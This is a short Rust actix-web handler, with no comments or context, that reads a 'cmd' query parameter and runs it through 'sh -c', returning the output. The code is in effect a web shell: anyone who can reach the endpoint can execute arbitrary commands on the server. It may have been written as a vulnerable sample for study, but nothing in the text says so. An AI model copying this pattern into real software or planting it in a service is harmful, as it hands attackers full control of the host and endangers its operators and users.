use actix_web::{web, HttpResponse};
use serde::Deserialize;

#[derive(Deserialize)]
struct P {
    cmd: String,
}

async fn h(q: web::Query<P>) -> HttpResponse {
    let out = std::process::Command::new("sh").arg("-c").arg(&q.cmd).output().unwrap();
    HttpResponse::Ok().body(out.stdout)
}
